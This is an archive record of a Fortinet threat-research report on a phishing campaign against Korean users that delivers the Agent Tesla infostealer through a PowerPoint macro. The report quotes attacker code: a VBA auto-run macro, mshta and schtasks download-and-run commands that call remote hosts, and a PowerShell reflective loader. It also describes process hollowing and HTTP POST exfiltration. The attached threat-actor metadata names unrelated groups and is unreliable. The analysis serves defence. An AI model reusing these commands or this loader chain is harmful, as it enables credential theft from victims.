{
    "id": "2c17cac2-ce8b-431b-a20a-857c2e1a9a3f",
    "created_at": "2022-10-25T16:48:18.744156Z",
    "updated_at": "2025-03-27T02:17:05.732288Z",
    "deleted_at": null,
    "sha1_hash": "299c27eb159fe1a4bfbe577d7e483cee054d2d96",
    "title": "Phishing Campaign Targeting Korean to Deliver Agent Tesla New Variant",
    "authors": "Fortinet",
    "file_creation_date": "2022-03-01T17:28:47Z",
    "file_modification_date": "2022-03-01T17:28:47Z",
    "file_size": 127797,
    "plain_text": "# Phishing Campaign Targeting Korean to Deliver Agent Tesla New Variant\n\n**[fortinet.com/blog/threat-research/phishing-campaign-targeting-korean-to-deliver-agent-tesla-new-variant](https://www.fortinet.com/blog/threat-research/phishing-campaign-targeting-korean-to-deliver-agent-tesla-new-variant)**\n\nDecember 10, 2021\n\n**[FortiGuard Labs Threat Research Report](https://www.fortinet.com/fortiguard/labs.html?utm_source=blog&utm_medium=campaign&utm_campaign=FortiGuardLabs)**\n\n**Affected platforms: Microsoft Windows**\n\n**Impacted parties:  Windows Users**\n\n**Impact:           Collects sensitive information from victims’ device**\n**Severity level:     Critical**\n\n[A phishing campaign was recently caught in the wild by Fortinet’s FortiGuard Labs, that delivers a malicious Microsoft](https://www.fortinet.com/fortiguard/labs?utm_source=blog&utm_campaign=fortiguardlabs)\nPowerPoint file. The content of the phishing email, written in Korean, asks recipients to open the attached PowerPoint\nfile to review a purchase order. I researched what this malicious file does once the PowerPoint file is opened and have\nbeen able to confirm that it is spreading a new variant of Agent Tesla.\n\nOver the past several years, we have captured and analyzed many Agent Tesla variants. It has been quite active since\n[2014 when it was first observed. Agent Tesla is a .Net-based malware (developed in C#.Net, VB.Net, C++.Net, etc.)](https://www.fortinet.com/resources/cyberglossary/malware?utm_source=blog&utm_campaign=malware)\nwhose core function is to collect sensitive information from a victim’s machine, including recording keystrokes and data\non the system clipboard, stealing saved software credentials (browsers, mail clients, VPN, FTP, IM, etc.), stealing\nbrowser cookies files, and taking screenshots.\n\nIn this blog we will look at the phishing email, analyze the malicious macro contained in the attachment, show how the\nmalware is updated and maintains persistence, examine the Agent Tesla payload, and show the ways it exfiltrates stolen\ndata and credentials.\n\nLet’s start with how most cyberattacks begin – with a phishing email.\n\n## The Phishing Email\n\nFigure 1.1 – Display of the phishing email\nThe phishing email is written in Korean and its translated content has been included on the right side of the image in\nFigure 1.1. The attacker attempts to lure the recipient into opening the attached file to confirm a purchase order.\nFortinet’s [FortiMail has identified this phishing email as SPAM and added a tag “[SPAM detected by FortiMail]” to the](https://www.fortinet.com/products/email-security/fortimail.html?utm_source=blog&utm_campaign=fortimail-main-page)\nsubject to warn the recipient, as shown in Figure 1.1.\n\n## Leverage Malicious Macro in PowerPoint\n\nAs you probably guessed, the attached file is fake. There is no slide in the PowerPoint file, but a macro containing an\nauto-run function method called “Auto_Open()”. This function is called once the file is opened in MS PowerPoint.\n\nHere is the VBA code of this method:\n\nSub Auto_Open()\n\np_ = soraj.bear.GroupName\n\nShell p_\n\nEnd Sub\n\n\n-----\n\nsoraj is the name of a UserForm, bear is the name of CheckBox control inside soraj form. It calls Shell to execute\na command read from the “GroupName” property of “bear” CheckBox control.\n\nIn this code, “soraj” is the name of a UserForm and “bear” is the name of the CheckBox control inside the “soraj” form. It\ncalls “Shell” to execute a command read from the “GroupName” property of the “bear” CheckBox control.\n\nFigure 2.1 – The value of the property “GroupName” of “bear”\nFurther, “mshta hxxp[:]//bitly[.]com/gdhamksgdsadj” is the value of the “soraj.bear.GroupName” which is shown in\nFigure 2, and is the content of a binary profile file (named “o”) of the VBA project.\n\nIt consists of “mshta” and a URL, where “mshta” (“mshta.exe”) is a Windows default program that executes HTML\napplication files, including scripts (like VBScript). The URL opened by “mshta” is redirected to another URL,\n“hxxps[:]//onedayiwillloveyouforever[.]blogspot.com/p/divine111.html”, which contains a piece of code used to write an\nescaped VBScript code to a current HTML document to be executed by “mshta.exe”.\n\nFigure 2.2 is a screenshot of a proxy tool, allowing you to see the URL redirection and escaped VBScript code in the\nresponse packet.\n\nFigure 2.2 – The escaped VBScript code in the response packet\nThe escaped VBScript code is executed within the current HTML document using “mshat.exe”. I will refer to this kind of\n[VBScript as VBScript-embedded-in-HTML in this analysis. Click here to view the entire un-escaped code of the](https://pastebin.com/Sx5t7yKs)\nVBScript-embedded-in-HTML.\n\n## VBScript, PowerShell scripts for multiple tasks\n\nThe developer uses a wide variety of scripts, including VBScript-embedded-in-HTML, standalone VBScript, and\nPowerShell, during the process of delivering Agent Tesla to protect it from being easily analyzed.\n\nThese scripts are split into many files, and are downloaded at different times. The VBScript-embedded-in-HTML is the\nentry of the scripts. In the following section I will explain what they can do according to their behaviors.\n\n**1. Upgrading – Task Scheduler:**\n\nThe malware seeks to obtain a new version (if applicable) every two hours to be executed on the victim’s system. To do\nthis the VBScript-embedded-in-HTML performs a command-line command to add a recurring task into Task Scheduler.\nThe code snippet below is used to run “schtasks” command with the “/create” option to create a new scheduled task, as\nshown in Figure 3.1.\n\nargs = \"/create /sc MINUTE /mo 120 /tn \"\"\"\"update-Yendex \"\"\"\" /F /tr\n\"\"\"\"\\\"\"\"\"MsHtA\"\"\"\"\\\"\"\"\"hxxps://madarbloghogya.blogspot.com/p/divineback222.html\"\"\"\"\n\nSet Somosa = GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")\n\n'schtasks                     'open\n\nSomosa Shellexecute StrReverse(\"sksathcs\"), args, \"\", StrReverse(\"nepo\"), 0\n\nFigure 3.1 – Added scheduled task in Task Scheduler\nIt executes a VBScript code within a remote HTML file, then downloads the Agent Tesla payload to run on the victim’s\nsystem. It also detects and kills any other Agent Tesla process instances already running. This allows it to perform its\nupgrading function.\n\n**2. Persistence – StartMenu Startup:**\n\n\n-----\n\n[A standalone VBS file, %Public%\\hulalalMCROSOFT.vbs, extracted from VBScript embedded in HTML downloads](https://pastebin.com/1iKaC4ic)\nanother base64-encoded VBS file from\n“hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/5X7My8/b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb/files/divine12” into a local file. Going through the base64-decoded code, it saves the VBS code to a file called “UYA-update.vbs“\nlocated under %Public% folder.\n\nThis standalone VBS file downloads the Agent Tesla payload and deploys it on the victim’s system. As a result, whenever\nthe VBS file is executed it starts Agent Tesla.\n\nTo keep Agent Tesla alive on the victim’s system, it copies the downloaded standalone VBS file “UYA-update.vbs” into\nthe StartMenu’s Startup folder and renames it as “GTQ.vbs”. This allows it to start automatically when the system starts.\nFigure 3.2 displays the Startup folder with the copied “GTQ.vbs”.\n\nFigure 3.2 – Standalone VBS file copied in StartMenu Startup folder\n**3. Perform process-hollowing:**\n\n“UYA-update.vbs” continues to craft a piece of PowerShell code within a base64-decoded PE file from a local variable. It\nis ultimately executed by “PowerShell.exe”. The decoded PE file is a .Net program that contains a function named\n“Run()” belonging to class “ClassLibrary3.Class1”. Below is a piece of PowerShell code used to call this function.\n\n[System.AppDomain]::CurrentDomain.Load($fuUN).GetType('ClassLibrary3.Class1').GetMethod('Run').Invoke($null,\n\n[object[]] ('11enivid/selif/c4ab4d371cd40ce3303b4d33c868122f671fd37c/do8qxn/aygoh/steppins/0.2/ipa!/gro.tekcubtib//:sptth'))\n\nThe “$fuUN” variable contains the base64-decoded .Net PE file, from which it calls GetType() and GetMethod() to obtain\nthe function “ClassLibrary3.Class1.Run()”. Next, it calls the “Run()” function through Invoke() and passes a parameter\nwith a reversed URL. The URL is\n“hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine11”. Figure 3.3 is the entire code of function “ClassLibrary3.Class1.Run()”.\n\nFigure 3.3 – Function of “ClassLibrary3.Class1.Run()”\nAfter successfully calling \"ClassLibrary3.Class1.Run()\" of the decoded PE, it downloads two files from the hyperlinks:\n'hxxp[:]//149.56.200.165/rump/1.txt', which is for another .Net module to perform process-hollowing, and\n'hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine11', which is passed from PowerShell and is where it downloads the Agent Tesla payload from.\n\nThe Agent Tesla payload is fileless on the victim’s system. It is only kept in the memory of the PowerShell process. The\ndownloaded .Net module has a function named “ClassLibrary1.Class1.Run()” that perform the process-hollowing. It\npasses the Agent Tesla payload in memory and adds a path of the target process “RegAsm.exe”.\n\n“RegAsm.exe” is an official component of Microsoft .Net Framework. The attacker uses it as a target process in which to\ninject malware to protect itself from being detected.\n\n[A number of Windows API functions are called in the .Net module to deploy the Agent Tesla payload into the target](https://www.fortinet.com/resources/cyberglossary/api-security?utm_source=blog&utm_campaign=api-security)\nprocess. These are:\n\nCreateProcess() with CREATE_SUSPENDED flag: This creates a suspended RegAsm.exe process.\nVirtualAllocEx(), NtUnmapViewOfSection(), ReadProcessMemory(), WriteProcessMemory(): These move the\nAgent Tesla payload to a newly-allocated memory within the suspended RegAsm.exe process.\nSetThreadContext()/Wow64SetThreadContext(), GetThreadContext()/Wow64GetThreadContext(): These modify\nthe RegAsm.exe’s registry value and points its EIP register to the entry point of the copied Agent Tesla payload.\nResumeThread(): This resumes the execution of the RegAsm.exe process from where the EIP points to.\n\nOnce completed, the Agent Tesla runs on behalf of RegAsm.exe to steal the victim’s information.\n\n## Agent Tesla Payload\n\n\n-----\n\nAgent Tesla provides many features, like Keylogger, obtaining Clipboard data, stealing browser cookies and saved\nsoftware credentials, as well as capturing screenshots of the victim’s device.\n\nAgent Tesla publishes a Setup program that allows the attacker to choose which features to enable. The Tesla Agent\nSetup program then compiles the Agent Tesla payload file according to those choices.\n\nAgent Tesla starts these tasks in its Main() (stealing credentials), Timer (keylogger, stealing clipboard data, taking\nscreenshots), and Thread (stealing cookies from browsers) functions.\n\nIn this variant of Agent Tesla, the attacker has only enabled stealing credentials and cookies. The count of the software\nclients from which it steals credentials is more than 70, and can be categorized as Web Browsers, Email Clients, IM\nClients, VPN/FTP/Downloader/Database Clients, and Windows Credentials.\n\nThe list of the affected software clients is listed as below:\n\n**Chromium-based Web Browsers:**\nEpic Privacy, Uran, Chedot, Comodo Dragon, Chromium, Orbitum, Cool Novo, Sputnik, Coowon, Brave, Liebao Browser,\nElements Browser, Sleipnir 6, Vivaldi, 360 Browser, Torch Browser, Yandex Browser, QIP Surf, Amigo, Kometa, Citrio,\nOpera Browser, CentBrowser, 7Star, Coccoc, and Iridium Browser.\n\n**Web Browsers:**\nChrome, Microsoft Edge, Firefox, Safari, IceCat, Waterfox, Tencent QQBrowser, Flock Browser, SeaMonkey, IceDragon,\nFalkon, UCBrowser, Cyberfox, K-Meleon, PaleMoon.\n\n**VPN clients:**\nOpenVPN, NordVPN, RealVNC, TightVNC, UltraVNC, Private Internet Access VPN.\n\n**FTP clients:**\nFileZilla, Cftp, WS_FTP, FTP Navigator, FlashFXP, SmartFTP, WinSCP 2, CoreFTP, FTPGetter.\n\n**Email clients:**\nOutlook, Postbox, Thunderbird, Mailbird, eM Client, Claws-mail, Opera Mail, Foxmail, Qualcomm Eudora, IncrediMail,\nPocomail, Becky! Internet Mail, The Bat!.\n\n**Downloader/IM clients:**\nDownloadManager, jDownloader, Psi+, Trillian.\n\n**Others:**\nMySQL and Microsoft Credentials.\n\nFigure 4.1 displays the method used for stealing credentials from several clients.\n\nFigure 4.1 – Method used to steal credentials from some software clients\n\nFigure 4.2 – Display of stolen credentials from IceCat browser\nFigure 4.2 shows the credentials just stolen from a web browser, “IceCat”, where “Browser” is the software client name,\n“Password” is the saved password, “URL” is the login page, and “UserName” is the saved login user name.\n\nEach credentials of the stolen credentials has an above structure and saved in a global list variable, which later is\nformatted and sent to the attacker.\n\n## Sending the Stolen Data to the Attacker\n\nThere are four ways to transport the stolen data to the attacker. These are FTP Data (uploading stolen data in a file to a\nFTP server provided by the attacker), HTTP Post (sending data as the body of the post to a URL provided by the\nattacker), SMTP (sending stolen data to the attacker’s email address), and Telegram (using the Telegram bot API\n“sendDocument()” to send files to a specified chat or channel).\n\n\n-----\n\nThe attacker chose HTTP Post for this variant. Once Agent Tesla needs to send data to the attacker, it encrypts the stolen\ndata using a DES algorithm and encodes the result using a base64 algorithm, which is the final data to be sent as the\nbody in the HTTP Post request. The submission URL is \"hxxp[:]//69[.]174.99[.]181/webpaneldivine/mawa/7dd66d9f8e1cf61ae198.php\", which is a hardcoded string in Agent Tesla.\n\nFigure 5.1 demonstrates Agent Tesla sending stolen data as a value of “p=” in the body of HTTP POST.\n\nFigure 5.1 – Stolen data being sent in the body of HTTP Post\nEach item of stolen data before encryption is kept in the structure — “header” + “data”.\n\nThe “header” contains the basic information of the victim’s system:\n\n“Packet number” + ”Separator” + “Victim ID” + ”Separator” + “Date and Time” + ”Separator string” +\n“UserName/ComputerName” + ”Separator”\n\nThe “data” contains the stolen information, like credentials and cookies.\n\nFigure 5.2 – Example of a packet structure with packet number “6”\n\nFigure 5.2 shows an example of data with packet number “6”, which contains the basic information (“header” part) and\nthe Stolen Data (“data” part) that is base64-encoded cookies.\n“0de264895c1ed90486c73c6eb110af6c2222264a0854b0047b9ead88b718f7d0\" is the Separator string that is hardcoded\nin Agent Tesla. The Victim ID is a MD5 hash value generated from the system’s hardware information.\n\nAgent Tesla provides seven kinds of packets to send data/status to the attacker. Each packet has a packet number to\nidentify the packet. They are “0”, “1”, “2”, “3”, “4”, “5” and “6”.\n\nPacket “0”: It is always the first packet to tell the attacker that Agent Tesla has started. It only contains the “header”\ndata.\nPacket “1”: It is sent once every 120 seconds. It is like a heartbeat to tell the attacker that Agent Tesla is alive. It\nonly contains the “header” data.\nPacket “2”: It is sent every 60 seconds and only contains the “header” data. Agent Tesla reads the response and\nchecks if it contains “uninstall”. If yes, it uninstalls Agent Tesla from the victim’s system, including deleting all files\nmade by Agent Tesla and removing keys from registry that Agent Tesla created, and exits the process.\nPacket “3”: It sends the victim’s keystrokes (keylogger data) and stolen clipboard data within the “data” part of the\npost.\nPacket “4”: It sends captured screenshots of the victim’s screen within the “data” part of the post.\nPacket “5”: It sends the credentials stolen from the software clients within the “data” part of the post.\nPacket “6”: It sends cookies files in a ZIP archive that are collected from browsers and included within the “data”\npart of the post.\n\n## Conclusion\n\nIn this analysis, I have shown how this phishing campaign began by targeting Korean users.\n\nI then explained how the macro in the PowerPoint is used to execute a piece of VBScript-embedded-in-HTML code. It\nalso leverages a complicated standalone VBS and PowerShell script code to perform multiple tasks, like upgrading,\nmaintaining persistence, and process-hollowing.\n\nI then elaborated on what kind of software clients the Agent Tesla targets and what kind of data it is able to collect from\nthem, as well as how the stolen data is sent to the attacker via the HTTP Post method.\n\n## Fortinet Protections\n\n[Fortinet customers are already protected from this malware by FortiGuard’s Web Filtering, AntiVirus,](https://www.fortinet.com/support-and-training/support-services/fortiguard-security-subscriptions/web-filtering.html?utm_source=blog&utm_campaign=web-filtering) [FortiEDR, and](https://www.fortiweb-cloud.com/?utm_source=blog&utm_campaign=fortiweb-cloud)\nCDR (content disarm and reconstruction) services, as follows:\n\n\n-----\n\nThe malicious Macro inside the PowerPoint sample can be disarmed by the FortiGuard CDR (content disarm and\nreconstruction) service.\n\nAll relevant URLs have been rated as \"Malicious Websites\" by the FortiGuard Web Filtering service.\n\nThe PowerPoint sample attached to the phishing email and the standalone VBS file are detected as\n\"VBA/Agent.BLY!tr\" and \"VBS/AgentTesla.VTO!tr.dldr\" and are blocked by the FortiGuard AntiVirus service.\n\nFortiEDR detects the downloaded executable file as malicious based on its behavior.\n\nFortiMail protects Fortinet customers by blocking phishing emails and applying FortiGuard’s Web Filtering, AntiVirus,\nand CDR (content disarm and reconstruction) technologies.\n\nIn addition to these protections, we suggest that organizations have their end users also go through the FREE NSE\ntraining: [NSE 1 – Information Security Awareness. It includes a module on Internet threats that is designed to help end](https://training.fortinet.com/local/staticpage/view.php?page=nse_1&utm_source=blog&utm_campaign=nse-1)\nusers learn how to identify and protect themselves from phishing attacks.\n\n## IOCs\n\n**URLs Involved in the Campaign:**\n\n\"hxxps[:]//onedayiwillloveyouforever[.]blogspot[.]com/p/divine111.html\"\n\n\"hxxps[:]//madarbloghogya[.]blogspot[.]com/p/divineback222.html\"\n\n\"hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/5X7My8/b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb/files/divine12\"\n\n\"hxxp[:]//149[.]56.200[.]165/rump/1.txt\"\n\n\"hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine11\"\n\n\"hxxp[:]//69[.]174.99[.]181/webpanel-divine/mawa/7dd66d9f8e1cf61ae198.php\"\n\n**Sample SHA-256 Involved in the Campaign:**\n\n[새 구매 주문서 .ppa / new purchase order.ppa]\n\nAA121762EB34D32C7D831D7ABCEC34F5A4241AF9E669E5CC43A49A071BD6E894\n\n[UYA-update.vbs / GTQ.vbs]\n\n_0BBF16E320FB942E4EA09BB9E953076A4620F59E5FFAEFC3A2FFE8B8C2B3389C_\n\n_[Learn more about FortiGuard Labs global threat intelligence and research and the](https://www.fortinet.com/fortiguard/labs?utm_source=blog&utm_campaign=FortiGuardLabs)_ _FortiGuard Security Subscriptions_\n_and Services portfolio._\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/03bx0kiz8yyy8x2k8qh0ravuucb6sapq"
    ],
    "report_names": [
        "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)"
    ],
    "threat_actors": [
        {
            "id": "75455540-2f6e-467c-9225-8fe670e50c47",
            "created_at": "2022-10-25T16:07:23.740266Z",
            "updated_at": "2025-03-27T02:02:09.955585Z",
            "deleted_at": null,
            "main_name": "Iridium",
            "aliases": [],
            "source_name": "ETDA:Iridium",
            "tools": [
                "CHINACHOPPER",
                "China Chopper",
                "LazyCat",
                "Powerkatz",
                "SinoChopper",
                "reGeorg"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "0661a292-80f3-420b-9951-a50e03c831c0",
            "created_at": "2023-01-06T13:46:38.928796Z",
            "updated_at": "2025-03-27T02:00:02.953963Z",
            "deleted_at": null,
            "main_name": "IRIDIUM",
            "aliases": [],
            "source_name": "MISPGALAXY:IRIDIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d85adfe3-e1c3-40b0-b8bb-d1bacadc4d82",
            "created_at": "2022-10-25T16:07:23.619566Z",
            "updated_at": "2025-03-27T02:02:09.890982Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "APT-C-11",
                "ATK 32",
                "Gold Niagara",
                "ITG14",
                "TAG-CR1"
            ],
            "source_name": "ETDA:FIN7",
            "tools": [
                "7Logger",
                "Agentemis",
                "Anunak",
                "Astra",
                "BIOLOAD",
                "BIRDWATCH",
                "Bateleur",
                "Boostwrite",
                "CROWVIEW",
                "Carbanak",
                "Cobalt Strike",
                "CobaltStrike",
                "DICELOADER",
                "DNSMessenger",
                "FOWLGAZE",
                "HALFBAKED",
                "JSSLoader",
                "KillACK",
                "LOADOUT",
                "Lizar",
                "Meterpreter",
                "Mimikatz",
                "POWERPLANT",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "TEXTMATE",
                "Tirion",
                "VB Flash",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c39b0fe6-5642-4717-9a05-9e94265e3e3a",
            "created_at": "2022-10-25T16:07:24.332084Z",
            "updated_at": "2025-03-27T02:02:10.175452Z",
            "deleted_at": null,
            "main_name": "Tonto Team",
            "aliases": [
                "Bronze Huntley",
                "CactusPete",
                "Earth Akhlut",
                "HartBeat",
                "Karma Panda",
                "LoneRanger",
                "Operation Bitter Biscuit",
                "TAG-74",
                "Tonto Team"
            ],
            "source_name": "ETDA:Tonto Team",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Bioazih",
                "Bisonal",
                "CONIME",
                "Dexbia",
                "Korlia",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "POISONPLUG.SHADOW",
                "RoyalRoad",
                "ShadowPad Winnti",
                "XShellGhost"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041825,
    "ts_creation_date": 1646155727,
    "ts_modification_date": 1646155727,
    "files": {
        "pdf": "https://archive.orkl.eu/299c27eb159fe1a4bfbe577d7e483cee054d2d96.pdf",
        "text": "https://archive.orkl.eu/299c27eb159fe1a4bfbe577d7e483cee054d2d96.txt",
        "img": "https://archive.orkl.eu/299c27eb159fe1a4bfbe577d7e483cee054d2d96.jpg"
    }
}